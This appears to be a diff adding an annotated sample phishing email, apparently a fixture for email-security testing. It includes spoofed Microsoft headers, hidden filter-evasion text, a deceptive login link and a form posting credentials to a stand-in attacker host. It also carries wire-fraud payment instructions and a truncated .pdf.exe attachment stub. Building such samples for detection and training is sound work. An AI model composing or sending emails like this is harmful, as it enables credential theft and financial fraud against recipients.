@@ -1,0 +1,93 @@
+From: Microsoft 365 Security Team <support@micros0ft-security-updates.com>
+To: executive-finance@enterprise-target.com
+Subject: URGENT: Executive Password Expiry & Immediate Change of Wire Banking Remittance
+Date: Fri, 16 Oct 2026 14:30:00 +0000
+Message-ID: <sec-alert-991204@micros0ft-security-updates.com>
+Reply-To: security-recovery@gmail.com
+Return-Path: <bounce@micros0ft-security-updates.com>
+Received-SPF: fail (domain of micros0ft-security-updates.com does not designate 198.51.100.88 as permitted sender) client-ip=198.51.100.88; envelope-from=<bounce@micros0ft-security-updates.com>;
+Authentication-Results: mx.target.com; dkim=fail header.i=@micros0ft-security-updates.com; spf=fail (client-ip=198.51.100.88); dmarc=fail p=reject
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=attacker-server.net; s=selector1; h=from:subject:to; bh=fakehash==; b=fakeb64signature==
+Received: from mail.spoofed-attacker-relay.net ([198.51.100.88]) by mx.target.com with ESMTP id mta992; Fri, 16 Oct 2026 14:30:05 +0000
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="====BOUNDARY_EMAIL_SECURITY_CHECKLIST_492048=="
+
+--====BOUNDARY_EMAIL_SECURITY_CHECKLIST_492048==
+Content-Type: text/html; charset="utf-8"
+Content-Transfer-Encoding: 7bit
+
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Security Alert - Immediate Verification Required</title>
+  <meta http-equiv="refresh" content="30;url=http://192.168.1.100/redirect.php">
+</head>
+<body style="font-family: Arial, sans-serif; background-color: #f9f9f9; padding: 20px;">
+  <div style="max-width: 600px; margin: 0 auto; background: #fff; padding: 25px; border-radius: 12px; border: 1px solid #ddd;">
+    <h2 style="color: #d9381e;">Critical Security Notification &amp; Wire Payment Instructions</h2>
+    <p>Dear Corporate Executive,</p>
+    <p>Your Microsoft 365 authentication certificate has expired. To maintain secure access to your account and enterprise mail routing, you must re-verify your identity immediately.</p>
+    
+    <!-- Concealed text for filter evasion -->
+    <div style="font-size: 0px; color: transparent; display: none;">
+      bypass spam scoring bayesian words system health normal authorized verification
+    </div>
+    <div style="position: absolute; left: -9999px;">
+      offscreen evasion tokens random string payload
+    </div>
+
+    <p style="margin: 20px 0;">
+      Please confirm your credentials via the official portal:
+      <br/>
+      <!-- Deceptive link text vs actual href destination -->
+      <a href="http://admin@evil-phishing-host.xyz/portal/login.php" style="font-size: 16px; font-weight: bold; color: #0066cc;">
+        https://login.microsoftonline.com/auth/verify-identity
+      </a>
+    </p>
+
+    <!-- Credential harvesting embedded form -->
+    <div style="background: #f4f6f8; padding: 15px; border-radius: 8px; margin: 20px 0;">
+      <h4 style="margin-top:0;">Direct SSO Credential Re-authentication</h4>
+      <form action="http://evil-phishing-host.xyz/harvest_credentials.php" method="POST">
+        <label>Work Email:</label><br/>
+        <input type="text" name="corporate_username" value="executive-finance@enterprise-target.com" style="width: 90%; padding: 6px; margin-bottom: 8px;"/><br/>
+        <label>Network Password:</label><br/>
+        <input type="password" name="corporate_password" placeholder="Enter corporate password" style="width: 90%; padding: 6px; margin-bottom: 8px;"/><br/>
+        <input type="submit" value="Authenticate Now" style="background: #0066cc; color: white; padding: 8px 16px; border: none; border-radius: 4px;"/>
+      </form>
+    </div>
+
+    <!-- BEC & Financial fraud instructions -->
+    <div style="background: #fff8e6; padding: 15px; border-left: 4px solid #f59e0b; margin-top: 20px;">
+      <h4 style="margin:0 0 8px 0; color: #92400e;">CONFIDENTIAL: Updated Banking Remittance Details</h4>
+      <p style="font-size: 13px; margin: 0 0 8px 0;">
+        Per executive order, please update the vendor routing number and banking details for pending invoices.
+        All pending wire transfers must be executed to our updated bank account before 5pm bank cutoff:
+      </p>
+      <ul style="font-size: 13px; margin: 0; padding-left: 20px;">
+        <li>Bank: Global Commercial Trust</li>
+        <li>Routing Number: 021000021</li>
+        <li>SWIFT Code: GBLCOMMUS33</li>
+        <li>IBAN: GB29NWBK60161331926819</li>
+        <li>Wire Amount: $185,450.00 USD</li>
+      </ul>
+      <p style="font-size: 12px; color: #b45309; margin-top: 8px; font-weight: bold;">
+        Strict confidentiality is required; do not discuss this wire transfer with anyone until completed.
+      </p>
+    </div>
+
+    <!-- Tracking beacon -->
+    <img src="http://tracking-pixel.analytic-tracker.top/beacon.gif" width="1" height="1" style="display:none;" alt="tracking_beacon"/>
+  </div>
+</body>
+</html>
+
+--====BOUNDARY_EMAIL_SECURITY_CHECKLIST_492048==
+Content-Type: application/x-dosexec; name="Remittance_Invoice_Q3.pdf.exe"
+Content-Disposition: attachment; filename="Remittance_Invoice_Q3.pdf.exe"
+Content-Transfer-Encoding: base64
+
+TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAA2AAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1v
+ZGUuDQ0KJAAAAAAAAABQRQAATAEDAAAAAAAAAAAAAAAAAPAAAAAAAAAA
+--====BOUNDARY_EMAIL_SECURITY_CHECKLIST_492048==--
